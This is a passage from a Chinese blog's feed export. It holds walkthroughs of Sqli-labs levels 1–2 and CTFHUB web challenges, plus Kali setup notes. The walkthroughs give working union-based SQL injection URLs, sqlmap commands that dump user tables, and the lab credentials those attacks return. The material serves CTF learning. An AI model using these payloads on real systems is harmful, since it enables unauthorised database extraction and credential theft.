class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> from information_schema.tables where table_schema=&#x27;security&#x27; --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, group_concat(username,<span class="hljs-number">0</span>x3a,password) from users --+<br><span class="hljs-comment"># 结果如下显示：</span><br><span class="hljs-comment"># Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4,:</span><br></code></pre></td></tr></table></figure><h2 id="方法2：类似方法1，部分语法及显示不同"><a href="#方法2：类似方法1，部分语法及显示不同" class="headerlink" title="方法2：类似方法1，部分语法及显示不同"></a>方法2：类似方法1，部分语法及显示不同</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,2,group_concat(0x5c,username,0x5c,password) from users--+</span><br><span class="hljs-string"># 结果如下显示：</span><br><span class="hljs-string"># \Dumb\Dumb,\Angelina\I-kill-you,\Dummy\p@ssword,\secure\crappy,\stupid\stupidity,\superman\genious,\batman\mob!le,\admin\admin,\admin1\admin1,\admin2\admin2,\admin3\admin3,\dhakkan\dumbo,\admin4\admin4,\\</span><br></code></pre></td></tr></table></figure><h2 id="方法3：sqlmap工具"><a href="#方法3：sqlmap工具" class="headerlink" title="方法3：sqlmap工具"></a>方法3：sqlmap工具</h2><p>–dbs:是查看所有的数据库<br>–tables:是查看所有的表<br>–columns:是查看表中所有的字段名<br>–dump:是查询哪个表的数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 --dbs<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security --tables<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security -T <span class="hljs-built_in">users</span> --columns<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security -T <span class="hljs-built_in">users</span> -C password,<span class="hljs-built_in">id</span>,username --dump<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808115630.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808115932.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808115948.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808120010.png" alt="image.png"></p><h1 id="语法点"><a href="#语法点" class="headerlink" title="语法点"></a>语法点</h1><h2 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h2><p><strong>ORDER BY</strong>可以对结果进行排序，在没有明确指定<strong>ASC</strong>（升序）或<strong>DESC</strong>（降序）的情况下，默认按升序排列。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">SELECT &lt;列名1&gt;, &lt;列名2&gt;, …<br>FROM &lt;表名&gt;<br>ORDER BY &lt;列名1&gt;, &lt;列名2&gt;, …, ASC|DESC;<br></code></pre></td></tr></table></figure><h2 id="SQL-UNION-操作符"><a href="#SQL-UNION-操作符" class="headerlink" title="SQL UNION 操作符"></a>SQL UNION 操作符</h2><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p><p>请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。</p><h2 id="DATABASE-函数"><a href="#DATABASE-函数" class="headerlink" title="DATABASE()函数"></a>DATABASE()函数</h2><p>DATABASE()函数返回当前数据库的名称。<br>如果没有当前数据库，则此函数返回NULL或“”。<br>SELECT DATABASE();</p><h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">选择**information_schema**数据库：<br>use information_schema;<br>查询（**information_schema**数据库里面的）**tables表**中所有的**自增ID**：<br>select auto_increment from tables;<br>如果我们想要查询指定表的自增ID，可以用下列语句：<br>select auto_increment from tables <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">&#x27;表名&#x27;</span>;<br>**当然如果有同名的数据表，查出来的可就不只是一条记录了。可以加上指定数据库的条件。**<br>select auto_increment from tables <span class="hljs-built_in">where</span> table_schema=<span class="hljs-string">&#x27;数据库名&#x27;</span> and table_name=<span class="hljs-string">&#x27;表名&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat"></a>group_concat</h2><p>1、功能：</p><p>将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p><p>2、语法：</p><p>group_concat( [distinct] 要连接的字段 [order by 排序字段 asc&#x2F;desc ] [separator ‘分隔符’] )</p><h2 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h2><p>information_schema：表示所有信息，包括库、表、列<br>information_schema.tables：记录所有表名信息的表<br>information_schema.columns：记录所有列名信息的表<br>table_schema：数据库的名称<br>table_name:表名<br>column_name:列名<br>group_concat():显示所有查询到的数据</p><p>version():查看数据库版本<br>database():查看使用的数据库<br>user():查看当前用户<br>limit:limit子句分批来获取所有数据<br>group_concat():一次性获取所有的数据库信息</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/weixin_43096078/article/details/108215076"># SQL注入中，注释#、 –+、 –%20、 %23到底是什么意思？sqli-labs-master</a><br>方法1：<a href="https://blog.csdn.net/A9874564/article/details/122541945"># Sql-labs 第一关超详细讲解</a><br>方法2和方法3：<a href="https://www.cnblogs.com/junlebao/p/13758919.html"># sqli-labs第一关 详解</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf系列】Sql-labs 第01关：GET -Error based -Single quotes -String</title>
    <link href="/2023/08/08/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91Sql-labs/"/>
    <url>/2023/08/08/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91Sql-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="第01关：GET-Error-based-Single-quotes-String"><a href="#第01关：GET-Error-based-Single-quotes-String" class="headerlink" title="第01关：GET -Error based -Single quotes -String"></a>第01关：GET -Error based -Single quotes -String</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="方法1：手工注入"><a href="#方法1：手工注入" class="headerlink" title="方法1：手工注入"></a>方法1：手工注入</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">2</span><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">3</span><br><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">2</span><br><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;<br><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; --<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; --+<br><br><span class="hljs-comment"># 确定表中的列数</span><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">1</span> --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">3</span> --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">4</span> --+<br><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> from information_schema.tables --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> from information_schema.tables where table_schema=&#x27;security&#x27; --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, group_concat(username,<span class="hljs-number">0</span>x3a,password) from users --+<br><span class="hljs-comment"># 结果如下显示：</span><br><span class="hljs-comment"># Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4,:</span><br></code></pre></td></tr></table></figure><h3 id="方法2：类似方法1，部分语法及显示不同"><a href="#方法2：类似方法1，部分语法及显示不同" class="headerlink" title="方法2：类似方法1，部分语法及显示不同"></a>方法2：类似方法1，部分语法及显示不同</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,2,group_concat(0x5c,username,0x5c,password) from users--+</span><br><span class="hljs-string"># 结果如下显示：</span><br><span class="hljs-string"># \Dumb\Dumb,\Angelina\I-kill-you,\Dummy\p@ssword,\secure\crappy,\stupid\stupidity,\superman\genious,\batman\mob!le,\admin\admin,\admin1\admin1,\admin2\admin2,\admin3\admin3,\dhakkan\dumbo,\admin4\admin4,\\</span><br></code></pre></td></tr></table></figure><h3 id="方法3：sqlmap工具"><a href="#方法3：sqlmap工具" class="headerlink" title="方法3：sqlmap工具"></a>方法3：sqlmap工具</h3><p>–dbs:是查看所有的数据库<br>–tables:是查看所有的表<br>–columns:是查看表中所有的字段名<br>–dump:是查询哪个表的数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 --dbs<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security --tables<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security -T <span class="hljs-built_in">users</span> --columns<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security -T <span class="hljs-built_in">users</span> -C password,<span class="hljs-built_in">id</span>,username --dump<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808115630.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808115932.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808115948.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808120010.png" alt="image.png"></p><h2 id="语法点"><a href="#语法点" class="headerlink" title="语法点"></a>语法点</h2><h3 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h3><p><strong>ORDER BY</strong>可以对结果进行排序，在没有明确指定<strong>ASC</strong>（升序）或<strong>DESC</strong>（降序）的情况下，默认按升序排列。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">SELECT &lt;列名1&gt;, &lt;列名2&gt;, …<br>FROM &lt;表名&gt;<br>ORDER BY &lt;列名1&gt;, &lt;列名2&gt;, …, ASC|DESC;<br></code></pre></td></tr></table></figure><h3 id="SQL-UNION-操作符"><a href="#SQL-UNION-操作符" class="headerlink" title="SQL UNION 操作符"></a>SQL UNION 操作符</h3><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p><p>请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。</p><h3 id="DATABASE-函数"><a href="#DATABASE-函数" class="headerlink" title="DATABASE()函数"></a>DATABASE()函数</h3><p>DATABASE()函数返回当前数据库的名称。<br>如果没有当前数据库，则此函数返回NULL或“”。<br>SELECT DATABASE();</p><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">选择**information_schema**数据库：<br>use information_schema;<br>查询（**information_schema**数据库里面的）**tables表**中所有的**自增ID**：<br>select auto_increment from tables;<br>如果我们想要查询指定表的自增ID，可以用下列语句：<br>select auto_increment from tables <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">&#x27;表名&#x27;</span>;<br>**当然如果有同名的数据表，查出来的可就不只是一条记录了。可以加上指定数据库的条件。**<br>select auto_increment from tables <span class="hljs-built_in">where</span> table_schema=<span class="hljs-string">&#x27;数据库名&#x27;</span> and table_name=<span class="hljs-string">&#x27;表名&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat"></a>group_concat</h3><p>1、功能：</p><p>将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p><p>2、语法：</p><p>group_concat( [distinct] 要连接的字段 [order by 排序字段 asc&#x2F;desc ] [separator ‘分隔符’] )</p><h3 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h3><p>information_schema：表示所有信息，包括库、表、列<br>information_schema.tables：记录所有表名信息的表<br>information_schema.columns：记录所有列名信息的表<br>table_schema：数据库的名称<br>table_name:表名<br>column_name:列名<br>group_concat():显示所有查询到的数据</p><p>version():查看数据库版本<br>database():查看使用的数据库<br>user():查看当前用户<br>limit:limit子句分批来获取所有数据<br>group_concat():一次性获取所有的数据库信息</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_43096078/article/details/108215076"># SQL注入中，注释#、 –+、 –%20、 %23到底是什么意思？sqli-labs-master</a><br>方法1：<a href="https://blog.csdn.net/A9874564/article/details/122541945"># Sql-labs 第一关超详细讲解</a><br>方法2和方法3：<a href="https://www.cnblogs.com/junlebao/p/13758919.html"># sqli-labs第一关 详解</a></p><h1 id="第02关：GET-Error-based-Integer-based"><a href="#第02关：GET-Error-based-Integer-based" class="headerlink" title="第02关：GET -Error based -Integer based"></a>第02关：GET -Error based -Integer based</h1><h2 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h2><h3 id="方法1：手工注入-1"><a href="#方法1：手工注入-1" class="headerlink" title="方法1：手工注入"></a>方法1：手工注入</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">2</span><br><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">2</span><br><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> order by <span class="hljs-number">1</span> <br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> order by <span class="hljs-number">3</span> <br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> order by <span class="hljs-number">4</span><br><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database()<br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) from information_schema.tables<br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="hljs-string">&#x27;security&#x27;</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) from information_schema.columns where table_schema=<span class="hljs-string">&#x27;security&#x27;</span> and table_name=<span class="hljs-string">&#x27;users&#x27;</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,<span class="hljs-number">0</span>x3a,password) from users<br><br></code></pre></td></tr></table></figure><h3 id="方法2：sqlmap工具-同第01关"><a href="#方法2：sqlmap工具-同第01关" class="headerlink" title="方法2：sqlmap工具 同第01关"></a>方法2：sqlmap工具 同第01关</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 --dbs<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security --tables<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security -T <span class="hljs-built_in">users</span> --columns<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security -T <span class="hljs-built_in">users</span> -C password,<span class="hljs-built_in">id</span>,username --dump<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【kali】hyper-v中安装kali系统</title>
    <link href="/2023/08/07/ctf/%E3%80%90kali%E3%80%91hyper-v%E4%B8%AD%E5%AE%89%E8%A3%85kali%E7%B3%BB%E7%BB%9F/"/>
    <url>/2023/08/07/ctf/%E3%80%90kali%E3%80%91hyper-v%E4%B8%AD%E5%AE%89%E8%A3%85kali%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://www.kali.org/get-kali/#kali-platforms">https://www.kali.org/get-kali/#kali-platforms</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808100246.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808100309.png" alt="image.png"></p><p>下载之后，解压</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>hyper-v新建虚拟机<br>选择“第二代”<br>禁用“启用安全启动”</p><h2 id="ssh远程连接"><a href="#ssh远程连接" class="headerlink" title="ssh远程连接"></a>ssh远程连接</h2><p><a href="https://blog.csdn.net/bangshao1989/article/details/125249371">https://blog.csdn.net/bangshao1989/article/details/125249371</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【虚拟机】hyper-v中安装kali系统</title>
    <link href="/2023/08/07/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91hyper-v%E4%B8%AD%E5%AE%89%E8%A3%85kali%E7%B3%BB%E7%BB%9F/"/>
    <url>/2023/08/07/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91hyper-v%E4%B8%AD%E5%AE%89%E8%A3%85kali%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://www.kali.org/get-kali/#kali-platforms">https://www.kali.org/get-kali/#kali-platforms</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808100246.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808100309.png" alt="image.png"></p><p>下载之后，解压</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>hyper-v新建虚拟机<br>选择“第二代”<br>禁用“启用安全启动”</p><h2 id="ssh远程连接"><a href="#ssh远程连接" class="headerlink" title="ssh远程连接"></a>ssh远程连接</h2><p><a href="https://blog.csdn.net/bangshao1989/article/details/125249371">https://blog.csdn.net/bangshao1989/article/details/125249371</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf系列】CTFHUB</title>
    <link href="/2023/08/07/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91CTFHUB/"/>
    <url>/2023/08/07/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91CTFHUB/</url>
    
    <content type="html"><![CDATA[<h2 id="web-请求方式"><a href="#web-请求方式" class="headerlink" title="web 请求方式"></a>web 请求方式</h2><p>HTTP 请求方法, HTTP&#x2F;1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。</p><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/aFVx7vvx1bsSVoCk3zh68x.html">请求方式-writeup</a></p><p>重点内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># curl -X 指定请求方法</span><br>curl -X CTFHUB http://challenge-f9bba78a0639c4e4.sandbox.ctfhub.com:10800/index.php<br></code></pre></td></tr></table></figure><h2 id="web-302跳转"><a href="#web-302跳转" class="headerlink" title="web 302跳转"></a>web 302跳转</h2><p>状态码301：永久跳转（永久重定向）。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替<br>状态码302：临时重定向</p><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/erBvC63BtiquPYT4C3MUzX.html">302跳转-writeup</a></p><p>重点内容：<br>1）可以用curl直接访问<br>2）用burpsuite来访问</p><h2 id="Web-Cookie"><a href="#Web-Cookie" class="headerlink" title="Web Cookie"></a>Web Cookie</h2><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/6zSDRPLbitJ5j4e7CE9dLp.html">Cookie-witeup</a></p><h2 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h2><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/3mSzAzbGydVT74nsq1gcVj.html">基础认证-writeip</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /flag.html HTTP/1.1<br>Host: challenge-879836353d25e7b6.sandbox.ctfhub.com:10800<br>Cache-Control: max-age=0<br>Authorization: Basic YWRtaW46MTIzNDU2            <span class="hljs-comment">### 重点</span><br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Referer: http://challenge-879836353d25e7b6.sandbox.ctfhub.com:10800/<br>Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6<br>Connection: close<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230807193523.png" alt="image.png"></p><p>重点内容：取消Payload Encoding</p><h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p><a 